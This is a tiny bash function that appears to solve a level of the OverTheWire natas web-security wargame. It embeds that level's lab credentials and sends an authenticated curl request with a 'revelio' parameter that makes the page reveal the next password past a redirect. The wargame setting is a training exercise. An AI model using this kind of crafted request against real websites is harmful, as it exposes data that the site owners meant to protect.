natas22_(){
	user_pass="natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
	url="http://natas22.natas.labs.overthewire.org"

	val=$(curl -isu $user_pass $url?revelio=1)

	echo "$val"
}
